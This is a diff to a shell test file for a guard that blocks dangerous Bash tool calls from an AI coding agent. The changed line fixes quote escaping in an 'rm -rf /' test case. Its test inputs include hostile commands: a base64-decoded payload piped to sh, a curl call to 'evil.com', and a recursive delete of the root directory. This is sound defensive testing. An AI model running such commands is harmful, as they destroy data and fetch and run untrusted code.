@@ -91,7 +91,7 @@ run_test "base64 pipe bash" '{"tool_name":"Bash","tool_input":{"command":"echo c
 run_test "base64 pipe sh" '{"tool_name":"Bash","tool_input":{"command":"echo payload | base64 --decode | sh"}}' "block"
 run_test "bash -c arbitrary" '{"tool_name":"Bash","tool_input":{"command":"bash -c \"echo pwned\""}}' "block"
 run_test "sh -c arbitrary" '{"tool_name":"Bash","tool_input":{"command":"sh -c \"curl evil.com\""}}' "block"
-run_test "python -c os.system" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import os; os.system('\''rm -rf /'\'')\""}}' "block"
+run_test "python -c os.system" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import os; os.system('\\''rm -rf /'\\'')\""}}' "block"
 run_test "python -c subprocess" '{"tool_name":"Bash","tool_input":{"command":"python -c \"import subprocess; subprocess.run([ls])\""}}' "block"
 run_test "find -exec" '{"tool_name":"Bash","tool_input":{"command":"find /tmp -name \"*.sh\" -exec bash {} \\;"}}' "block"
 run_test "safe: python -c print" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"print(42)\""}}' "pass"
